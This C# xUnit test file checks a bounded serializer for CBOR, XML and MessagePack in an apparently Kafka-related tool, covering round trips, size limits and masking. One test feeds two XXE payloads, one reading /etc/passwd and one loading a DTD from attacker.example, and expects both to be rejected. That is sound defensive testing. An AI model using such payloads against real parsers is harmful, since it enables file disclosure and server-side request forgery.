using System.Text;
using System.Text.Json;
using Kafdeck.Core.Kafka;
using Kafdeck.Core.Records;
using Kafdeck.Modules.Records;
using Kafdeck.Infrastructure.SerDe;
using Xunit;

namespace Kafdeck.Architecture.Tests;

public sealed class V07W56ControlledSerdeTests
{
    private static readonly DateTimeOffset Deadline =
        DateTimeOffset.UtcNow.AddMinutes(1);

    [Fact]
    public void Api_bounds_base64_text_before_decode_allocation()
    {
        var root = FindRepositoryRoot();
        var source = File.ReadAllText(
            Path.Combine(
                root,
                "src",
                "backend",
                "Kafdeck.Api",
                "KafdeckControlledSerdeEndpoints.cs"));

        var boundCheck = source.IndexOf(
            "request.PayloadBase64.Length >",
            StringComparison.Ordinal);
        var decodeCall = source.IndexOf(
            "Convert.FromBase64String",
            StringComparison.Ordinal);

        Assert.True(boundCheck >= 0);
        Assert.True(decodeCall > boundCheck);
        Assert.Contains(
            "MaxBase64InputCharacters",
            source,
            StringComparison.Ordinal);
    }

    [Fact]
    public void Capabilities_are_closed_and_explicit()
    {
        var capabilities =
            new ControlledSerdeService().GetCapabilities();

        Assert.Equal(
            new[]
            {
                ControlledSerdeFormat.Cbor,
                ControlledSerdeFormat.Xml,
                ControlledSerdeFormat.MessagePack,
            },
            capabilities
                .Select(item => item.Format)
                .OrderBy(item => item)
                .ToArray());

        Assert.All(
            capabilities,
            item =>
            {
                Assert.True(item.DecodeSupported);
                Assert.True(item.EncodeSupported);
                Assert.NotEmpty(item.Limitations);
            });
    }

    [Theory]
    [InlineData(ControlledSerdeFormat.Cbor)]
    [InlineData(ControlledSerdeFormat.MessagePack)]
    public async Task Binary_formats_round_trip_bounded_structured_values(
        ControlledSerdeFormat format)
    {
        using var source = JsonDocument.Parse(
            """
            {
              "a": 1,
              "b": [true, "x", null],
              "binary": { "$binary": "AQIDBA==" },
              "nested": { "n": -8, "d": 1.25 }
            }
            """);

        var service = new ControlledSerdeService();
        var encoded = await service.EncodeAsync(
            new ControlledSerdeEncodeRequest(
                format,
                source.RootElement.Clone()),
            ControlledSerdeLimits.Default,
            Deadline);

        Assert.True(encoded.IsSuccess, encoded.Failure?.SafeMessage);
        Assert.NotNull(encoded.Value);
        Assert.NotEmpty(encoded.Value!.Payload.ToArray());

        var decoded = await service.DecodeAsync(
            new ControlledSerdeDecodeRequest(
                format,
                encoded.Value.Payload),
            ControlledSerdeLimits.Default,
            Deadline);

        Assert.True(decoded.IsSuccess, decoded.Failure?.SafeMessage);
        Assert.NotNull(decoded.Value);
        Assert.True(
            JsonElement.DeepEquals(
                source.RootElement,
                decoded.Value!.StructuredValue));
    }

    [Theory]
    [InlineData(ControlledSerdeFormat.Cbor)]
    [InlineData(ControlledSerdeFormat.MessagePack)]
    public async Task Binary_encode_is_deterministic(
        ControlledSerdeFormat format)
    {
        using var source = JsonDocument.Parse(
            """{"z":2,"a":1,"items":[3,2,1]}""");
        var service = new ControlledSerdeService();

        var first = await service.EncodeAsync(
            new ControlledSerdeEncodeRequest(
                format,
                source.RootElement.Clone()),
            ControlledSerdeLimits.Default,
            Deadline);
        var second = await service.EncodeAsync(
            new ControlledSerdeEncodeRequest(
                format,
                source.RootElement.Clone()),
            ControlledSerdeLimits.Default,
            Deadline);

        Assert.True(first.IsSuccess);
        Assert.True(second.IsSuccess);
        Assert.Equal(
            first.Value!.Payload.ToArray(),
            second.Value!.Payload.ToArray());
    }

    [Fact]
    public async Task Xml_round_trip_uses_deterministic_projection()
    {
        using var projection = JsonDocument.Parse(
            """
            {
              "name": "order",
              "attributes": {
                "id": "42"
              },
              "content": [
                "hello",
                {
                  "name": "item",
                  "attributes": {},
                  "content": ["world"]
                }
              ]
            }
            """);

        var service = new ControlledSerdeService();
        var encoded = await service.EncodeAsync(
            new ControlledSerdeEncodeRequest(
                ControlledSerdeFormat.Xml,
                projection.RootElement.Clone()),
            ControlledSerdeLimits.Default,
            Deadline);

        Assert.True(encoded.IsSuccess, encoded.Failure?.SafeMessage);
        var xml = Encoding.UTF8.GetString(
            encoded.Value!.Payload.Span);
        Assert.Equal(
            """<order id="42">hello<item>world</item></order>""",
            xml);

        var decoded = await service.DecodeAsync(
            new ControlledSerdeDecodeRequest(
                ControlledSerdeFormat.Xml,
                encoded.Value.Payload),
            ControlledSerdeLimits.Default,
            Deadline);

        Assert.True(decoded.IsSuccess, decoded.Failure?.SafeMessage);
        Assert.True(
            JsonElement.DeepEquals(
                projection.RootElement,
                decoded.Value!.StructuredValue));
    }

    [Theory]
    [InlineData("""<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>""")]
    [InlineData("""<!DOCTYPE x SYSTEM "https://attacker.example/evil.dtd"><x/>""")]
    public async Task Xml_dtd_and_external_entity_resolution_are_prohibited(
        string xml)
    {
        var service = new ControlledSerdeService();

        var result = await service.DecodeAsync(
            new ControlledSerdeDecodeRequest(
                ControlledSerdeFormat.Xml,
                Encoding.UTF8.GetBytes(xml)),
            ControlledSerdeLimits.Default,
            Deadline);

        Assert.False(result.IsSuccess);
        Assert.Equal(
            ControlledSerdeFailureCategory.MalformedInput,
            result.Failure!.Category);
        Assert.Equal(
            "serde_malformed_input",
            result.Failure.Code);
    }

    [Fact]
    public async Task Cbor_indefinite_and_tagged_values_fail_closed()
    {
        var service = new ControlledSerdeService();

        var indefinite = await service.DecodeAsync(
            new ControlledSerdeDecodeRequest(
                ControlledSerdeFormat.Cbor,
                new byte[] { 0x9F, 0x01, 0xFF }),
            ControlledSerdeLimits.Default,
            Deadline);
        Assert.False(indefinite.IsSuccess);
        Assert.Equal(
            "serde_cbor_indefinite_unsupported",
            indefinite.Failure!.Code);

        var tagged = await service.DecodeAsync(
            new ControlledSerdeDecodeRequest(
                ControlledSerdeFormat.Cbor,
                new byte[] { 0xC0, 0x61, 0x78 }),
            ControlledSerdeLimits.Default,
            Deadline);
        Assert.False(tagged.IsSuccess);
        Assert.Equal(
            "serde_cbor_tag_unsupported",
            tagged.Failure!.Code);
    }

    [Fact]
    public async Task MessagePack_extensions_and_non_string_map_keys_fail_closed()
    {
        var service = new ControlledSerdeService();

        var extension = await service.DecodeAsync(
            new ControlledSerdeDecodeRequest(
                ControlledSerdeFormat.MessagePack,
                new byte[] { 0xD4, 0x01, 0x00 }),
            ControlledSerdeLimits.Default,
            Deadline);
        Assert.False(extension.IsSuccess);
        Assert.Equal(
            "serde_messagepack_extension_unsupported",
            extension.Failure!.Code);

        var numericKey = await service.DecodeAsync(
            new ControlledSerdeDecodeRequest(
                ControlledSerdeFormat.MessagePack,
                new byte[] { 0x81, 0x01, 0x02 }),
            ControlledSerdeLimits.Default,
            Deadline);
        Assert.False(numericKey.IsSuccess);
        Assert.Equal(
            "serde_messagepack_map_key_unsupported",
            numericKey.Failure!.Code);
    }

    [Theory]
    [InlineData(ControlledSerdeFormat.Cbor, "8201")]
    [InlineData(ControlledSerdeFormat.MessagePack, "9201")]
    public async Task Truncated_binary_payloads_are_rejected(
        ControlledSerdeFormat format,
        string hex)
    {
        var service = new ControlledSerdeService();
        var bytes = Convert.FromHexString(hex);

        var result = await service.DecodeAsync(
            new ControlledSerdeDecodeRequest(
                format,
                bytes),
            ControlledSerdeLimits.Default,
            Deadline);

        Assert.False(result.IsSuccess);
        Assert.Equal(
            ControlledSerdeFailureCategory.MalformedInput,
            result.Failure!.Category);
    }

    [Fact]
    public async Task Depth_collection_and_string_bounds_fail_at_cap_plus_one()
    {
        var service = new ControlledSerdeService();

        using var deep = JsonDocument.Parse(
            """{"a":{"b":{"c":1}}}""");
        var depthLimits = Limits(
            maxDepth: 2);

        var depth = await service.EncodeAsync(
            new ControlledSerdeEncodeRequest(
                ControlledSerdeFormat.Cbor,
                deep.RootElement.Clone()),
            depthLimits,
            Deadline);
        Assert.False(depth.IsSuccess);
        Assert.Equal(
            "serde_structure_bound_exceeded",
            depth.Failure!.Code);

        using var collection = JsonDocument.Parse(
            """[1,2,3]""");
        var collectionResult = await service.EncodeAsync(
            new ControlledSerdeEncodeRequest(
                ControlledSerdeFormat.MessagePack,
                collection.RootElement.Clone()),
            Limits(maxCollectionItems: 2),
            Deadline);
        Assert.False(collectionResult.IsSuccess);
        Assert.Equal(
            "serde_collection_bound_exceeded",
            collectionResult.Failure!.Code);

        using var text = JsonDocument.Parse(
            "\"abcd\"");
        var stringResult = await service.EncodeAsync(
            new ControlledSerdeEncodeRequest(
                ControlledSerdeFormat.Cbor,
                text.RootElement.Clone()),
            Limits(maxStringCharacters: 3),
            Deadline);
        Assert.False(stringResult.IsSuccess);
        Assert.Equal(
            "serde_string_bound_exceeded",
            stringResult.Failure!.Code);
    }

    [Fact]
    public async Task Encode_output_bound_is_enforced_during_write()
    {
        using var value = JsonDocument.Parse(
            """{"message":"this-output-is-longer-than-eight-bytes"}""");

        var result = await new ControlledSerdeService().EncodeAsync(
            new ControlledSerdeEncodeRequest(
                ControlledSerdeFormat.Cbor,
                value.RootElement.Clone()),
            Limits(
                maxOutputBytes: 8,
                maxStringCharacters: 128),
            Deadline);

        Assert.False(result.IsSuccess);
        Assert.Equal(
            ControlledSerdeFailureCategory.BoundExceeded,
            result.Failure!.Category);
        Assert.Equal(
            "serde_output_bound_exceeded",
            result.Failure.Code);
    }

    [Fact]
    public async Task Decode_projection_obeys_output_bound_after_binary_expansion()
    {
        byte[] cborByteString =
        [
            0x44,
            0x01,
            0x02,
            0x03,
            0x04,
        ];

        var result = await new ControlledSerdeService().DecodeAsync(
            new ControlledSerdeDecodeRequest(
                ControlledSerdeFormat.Cbor,
                cborByteString),
            Limits(
                maxOutputBytes: 12,
                maxBinaryBytes: 16),
            Deadline);

        Assert.False(result.IsSuccess);
        Assert.Equal(
            ControlledSerdeFailureCategory.BoundExceeded,
            result.Failure!.Category);
        Assert.Equal(
            "serde_output_bound_exceeded",
            result.Failure.Code);
    }

    [Theory]
    [InlineData(ControlledSerdeFormat.Cbor)]
    [InlineData(ControlledSerdeFormat.MessagePack)]
    public async Task Binary_projection_obeys_binary_bound(
        ControlledSerdeFormat format)
    {
        using var value = JsonDocument.Parse(
            """{"$binary":"AQIDBA=="}""");
        var service = new ControlledSerdeService();

        var result = await service.EncodeAsync(
            new ControlledSerdeEncodeRequest(
                format,
                value.RootElement.Clone()),
            Limits(maxBinaryBytes: 3),
            Deadline);

        Assert.False(result.IsSuccess);
        Assert.Equal(
            "serde_binary_bound_exceeded",
            result.Failure!.Code);
    }

    [Theory]
    [InlineData("""<x xmlns="urn:test"><value>1</value></x>""")]
    [InlineData("""<p:x xmlns:p="urn:test"><p:value>1</p:value></p:x>""")]
    public async Task Xml_namespaces_are_explicitly_unsupported(
        string xml)
    {
        var result = await new ControlledSerdeService().DecodeAsync(
            new ControlledSerdeDecodeRequest(
                ControlledSerdeFormat.Xml,
                Encoding.UTF8.GetBytes(xml)),
            ControlledSerdeLimits.Default,
            Deadline);

        Assert.False(result.IsSuccess);
        Assert.Equal(
            ControlledSerdeFailureCategory.Unsupported,
            result.Failure!.Category);
        Assert.Equal(
            "serde_xml_namespace_unsupported",
            result.Failure.Code);
    }

    [Fact]
    public async Task Xml_projection_rejects_unknown_properties()
    {
        using var value = JsonDocument.Parse(
            """{"name":"x","attributes":{},"content":[],"evil":"value"}""");
        var service = new ControlledSerdeService();

        var result = await service.EncodeAsync(
            new ControlledSerdeEncodeRequest(
                ControlledSerdeFormat.Xml,
                value.RootElement.Clone()),
            ControlledSerdeLimits.Default,
            Deadline);

        Assert.False(result.IsSuccess);
        Assert.Equal(
            ControlledSerdeFailureCategory.InvalidRequest,
            result.Failure!.Category);
    }

    [Fact]
    public async Task Cancellation_and_expired_deadline_fail_without_processing()
    {
        var service = new ControlledSerdeService();
        using var cancellation = new CancellationTokenSource();
        cancellation.Cancel();

        var cancelled = await service.DecodeAsync(
            new ControlledSerdeDecodeRequest(
                ControlledSerdeFormat.Cbor,
                new byte[] { 0x01 }),
            ControlledSerdeLimits.Default,
            Deadline,
            cancellation.Token);
        Assert.False(cancelled.IsSuccess);
        Assert.Equal(
            ControlledSerdeFailureCategory.Cancelled,
            cancelled.Failure!.Category);

        var expired = await service.DecodeAsync(
            new ControlledSerdeDecodeRequest(
                ControlledSerdeFormat.Cbor,
                new byte[] { 0x01 }),
            ControlledSerdeLimits.Default,
            DateTimeOffset.UtcNow.AddSeconds(-1));
        Assert.False(expired.IsSuccess);
        Assert.Equal(
            ControlledSerdeFailureCategory.Timeout,
            expired.Failure!.Category);
    }

    [Fact]
    public async Task Record_inspection_routes_controlled_decode_through_filter_and_masking()
    {
        using var source = JsonDocument.Parse(
            """{"secret":"4111111111111111","visible":"ok"}""");
        var serde = new ControlledSerdeService();
        var encoded = await serde.EncodeAsync(
            new ControlledSerdeEncodeRequest(
                ControlledSerdeFormat.Cbor,
                source.RootElement.Clone()),
            ControlledSerdeLimits.Default,
            Deadline);
        Assert.True(encoded.IsSuccess, encoded.Failure?.SafeMessage);

        var now = DateTimeOffset.UtcNow;
        var reader = new SingleRecordReader(
            new KafkaRawRecord(
                7,
                now,
                null,
                encoded.Value!.Payload,
                Array.Empty<KafkaRecordHeader>()));

        var filter = new RecordFilterService(
            reader,
            decoder: null,
            evaluator: null,
            timeProvider: null,
            controlledSerde: serde);
        var plan = RecordFilterCompiler.Compile(
            new RecordFilterRequest(
                structuredFilter: new RecordStructuredFilter(
                    RecordFilterLanguage.Cel,
                    "value.visible == \"ok\"")));

        var read = new RecordReadRequest(
            "cluster-a",
            "orders",
            0,
            RecordAnchor.Earliest(),
            RecordReadDirection.Forward,
            RecordOperationBudget.Default);
        var filtered = await filter.FilterPageAsync(
            read,
            plan,
            new KafkaOperationContext(
                DateTimeOffset.UtcNow.AddSeconds(10)),
            requireDecodedValue: true,
            controlledSerdeFormat: ControlledSerdeFormat.Cbor,
            CancellationToken.None);

        Assert.True(filtered.IsSuccess, filtered.Failure?.SafeMessage);
        var item = Assert.Single(filtered.Value!.Records);
        Assert.NotNull(item.StructuredValue);
        Assert.Equal(
            "ok",
            item.StructuredValue!.Value
                .GetProperty("visible")
                .GetString());

        var policy = RecordMaskingPolicyCompiler.Compile(
            new RecordMaskingPolicyDefinition(
                "serde-record",
                1,
                [new RecordStructuredMaskRule("/secret")]));
        var safe = new RecordMaskingService().Apply(
            0,
            item,
            policy);

        Assert.Equal(
            RecordPayloadProjectionKind.Structured,
            safe.ValueKind);
        Assert.Null(safe.RawValue);
        Assert.Equal(
            "[REDACTED]",
            safe.StructuredValue!.Value
                .GetProperty("secret")
                .GetString());
        Assert.DoesNotContain(
            "4111111111111111",
            JsonSerializer.Serialize(safe),
            StringComparison.Ordinal);
    }

    private sealed class SingleRecordReader : IKafkaRecordReadPort
    {
        private readonly KafkaRawRecord _record;

        public SingleRecordReader(KafkaRawRecord record)
        {
            _record = record;
        }

        public Task<KafkaResult<RecordReadBatch>> ReadPageAsync(
            RecordReadRequest request,
            KafkaOperationContext operation,
            CancellationToken cancellationToken)
        {
            var now = DateTimeOffset.UtcNow;
            return Task.FromResult(
                KafkaResult<RecordReadBatch>.Success(
                    new RecordReadBatch(
                        [_record],
                        0,
                        8,
                        _record.Offset,
                        _record.Offset,
                        null,
                        null,
                        RecordBudgetOutcome.Complete),
                    new ObservationMetadata(
                        now,
                        now,
                        now,
                        ObservationSource.Live)));
        }
    }

    private static string FindRepositoryRoot()
    {
        DirectoryInfo? current =
            new(AppContext.BaseDirectory);

        while (current is not null)
        {
            if (File.Exists(
                    Path.Combine(
                        current.FullName,
                        "Kafdeck.slnx")))
            {
                return current.FullName;
            }

            current = current.Parent;
        }

        throw new DirectoryNotFoundException(
            "Unable to locate Kafdeck repository root.");
    }

    private static ControlledSerdeLimits Limits(
        int maxInputBytes = 1024,
        int maxOutputBytes = 1024,
        int maxDepth = 8,
        int maxNodes = 100,
        int maxCollectionItems = 16,
        int maxStringCharacters = 64,
        int maxBinaryBytes = 64) =>
        new(
            maxInputBytes,
            maxOutputBytes,
            maxDepth,
            maxNodes,
            maxCollectionItems,
            maxStringCharacters,
            maxBinaryBytes);
}
